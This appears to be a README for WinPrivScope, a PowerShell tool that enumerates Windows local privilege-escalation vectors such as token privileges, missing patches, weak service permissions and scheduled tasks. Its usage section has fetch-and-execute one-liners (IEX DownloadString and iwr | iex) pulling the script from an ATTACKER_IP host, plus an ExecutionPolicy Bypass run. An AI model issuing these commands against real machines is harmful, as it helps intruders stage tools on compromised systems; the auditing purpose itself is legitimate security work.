# WinPrivScope

## Description
WinPrivScope is a Windows security auditing tool designed to systematically identify potential local privilege escalation vectors by analyzing token privileges, kernel patch level, service configurations, and scheduled tasks, with a focus on misconfigurations and weak access controls.

---

## Overview
WinPrivScope is a PowerShell-based **Windows privilege escalation audit tool** intended for security assessments, system hardening, and controlled post-exploitation scenarios.
It performs local enumeration only and does not rely on external dependencies.

---

## Key Features

### Token Privilege Audit
- Identification of high-impact privileges, including:
  - SeImpersonatePrivilege
  - SeBackupPrivilege / SeRestorePrivilege
  - SeDebugPrivilege
  - SeLoadDriverPrivilege
  - SeTakeOwnershipPrivilege

### Kernel & Patch Analysis
- Windows version and build detection
- Enumeration of installed HotFixes
- Correlation of missing patches with known local privilege escalation CVEs

### Service Misconfiguration Analysis
- Writable service binaries
- Writable service directories
- Unquoted service paths
- Weak service permissions via:
  - Service SDDL
  - Registry ACLs

### Scheduled Tasks Analysis
- Enumeration of enabled scheduled tasks
- Detection of writable task binaries and directories
- Identification of tasks running with elevated privileges

---

## Output
- Color-coded findings
- Categorization by attack surface
- Detailed technical context:
  - ACLs
  - SDDL strings
  - File paths
  - Run-as accounts

---

## Requirements
- Windows operating system
- PowerShell 5.1 or later
- Administrative privileges not required

---

## Usage

### Local execution
    powershell -ExecutionPolicy Bypass -File WinPrivScope.ps1

### In-memory execution (IEX)
    IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/WinPrivScope.ps1')

### In-memory execution (modern PowerShell)
    iwr http://ATTACKER_IP/WinPrivScope.ps1 | iex

---

## Operational Notes
- Enumeration and auditing only
- No automatic exploitation
- Findings are heuristic-based and require manual validation
- Intended for:
  - Penetration testing
  - Red team operations
  - Blue team audits
  - Windows security training

---

## Disclaimer
This tool is intended for authorized security testing and educational purposes only.
Use only on systems you own or have explicit permission to test.
The author assumes no responsibility for misuse or unauthorized activity.
